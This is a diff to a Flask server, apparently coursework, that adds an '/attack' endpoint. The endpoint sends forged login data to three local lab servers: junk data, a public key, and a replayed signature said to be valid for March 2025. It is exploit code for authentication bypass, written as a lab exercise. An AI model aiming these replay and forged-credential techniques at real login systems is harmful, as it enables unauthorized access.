@@ -1,3 +1,4 @@
+import requests
 from flask import Flask, jsonify, request
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ed25519
@@ -131,6 +132,48 @@ def login(uid):
 @app.route("/peek", methods=["GET"])
 def peek():
     return jsonify(actions_log), 200
+
+
+@app.route("/attack/<server_name>", methods=["POST"])
+def attack(server_name):
+    """
+    Attack endpoint for the assignment.
+    If server_name == 'server_1', we attempt to exploit server_1 by
+    'logging in' as a user without providing a real signature.
+    If successful, respond with 'Attack was successful!'
+    Otherwise, respond with 'Attack failed!'.
+    """
+    if server_name == "server_1":
+        # server_1 is assumed to run on port 8001 locally
+        url = "http://localhost:8001/login/test1"
+        data = "nonsense"
+    elif server_name == "server_2":
+        # server_2 is assumed to run on port 8002 locally
+        url = "http://localhost:8002/login/test1"
+        data = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7XpKeJZF/nkzvKEfGouFbyRdq0B5RvVQAuWJl4JrG5 sasuke@assignment4"
+    elif server_name == "server_3":
+        # server_3 is assumed to run on port 8003 locally
+        url = "http://localhost:8003/login/test1"
+        # This is a valid signature for server_3 within 2025-03
+        data = b"4CDLg+B4MVuG/rkBmqtRDtGTarUvasgIp63berzp94l3O4iker8TjjV+bCToQwWHRT0NpDzTXSdvRR6gcFH0BQ=="
+    else:
+        return f"Server {server_name} not found. You can attack server_[1-3].\n", 404
+
+    try:
+        response = requests.post(url, data=data)
+        actions_log.append({
+            "args": ["attack", server_name],
+            "response": response.text,
+            "status": 200,
+            "message": "Attack successful"
+        })
+        if response.status_code == 200:
+            return "Attack was successful!\n", 200
+        else:
+            return "Attack failed!\n", 403
+    except Exception as e:
+        print(f"Error attacking server_1: {e}")
+        return "Attack failed!\n", 500
 
 
 if __name__ == "__main__":
